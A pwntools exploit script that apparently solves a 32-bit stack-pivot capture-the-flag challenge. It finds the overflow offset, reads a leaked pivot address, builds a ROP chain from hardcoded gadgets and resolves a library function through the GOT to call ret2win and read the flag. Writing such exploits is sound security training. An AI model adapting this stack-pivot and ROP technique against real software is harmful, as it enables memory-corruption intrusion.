from pwn import *

context.binary = './pivot32'
def probe_offset(index, prompts, answers):
    context.log_level = 'critical'

    p = process(context.binary.path)
    for i in range(index):
        p.recvuntil(prompts[i])
        p.sendline(answers[i])

    p.recvuntil(prompts[index])
    p.sendline(cyclic(1024))
    p.wait()
    p.close()

    core = Coredump('./core')
    context.log_level = 'info'
    return cyclic_find(core.fault_addr)

smash_offset = probe_offset(1, [">", ">"], ["test"])
info("Stack smash offset: %s" % smash_offset)

p = process(context.binary.path)
p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
pivot = int(p.recvline(), 16)
info("Pivot location: %s" % hex(pivot))

# Payload 1 (stage 2): 
# call ret2win relative to foothold_function
libpivot = ELF("./libpivot32.so")
ret2win_offset = libpivot.sym['ret2win'] - libpivot.sym['foothold_function']

# gef> info functions
# 0x08048520  foothold_function@plt
foothold_function_plt = p.elf.plt['foothold_function']

# gef> start
# gef> got foothold_function
# [0x804a024] foothold_function -> 0x8048526
foothold_function_got = p.elf.got['foothold_function']

# pop eax; ret
pop_eax = 0x0804882c

# mov eax, DWORD PTR [eax]; ret
mov_eax_dpeax = 0x08048830

# pop ebx; ret
pop_ebx = 0x080484a9

# add eax, ebx; ret
add_eax_ebx = 0x08048833

# call eax; ret
call_eax = 0x080485f0

p.recvuntil(">")
# First we do a call to the function because of lazy binding
p.sendline(p32(foothold_function_plt) + p32(pop_eax) + p32(foothold_function_got) + p32(mov_eax_dpeax) + p32(pop_ebx) + p32(ret2win_offset) + p32(add_eax_ebx) + p32(call_eax))

# Payload 2 (stage 1):
# Pivot to stage 2

# xchg esp, eax; ret
xchg_esp_eax = 0x0804882e

p.recvuntil(">")
p.sendline("\x90" * smash_offset + p32(pop_eax) + p32(pivot) + p32(xchg_esp_eax))

p.recvuntil("into libpivot\n")
success("Flag: " + p.recvall())
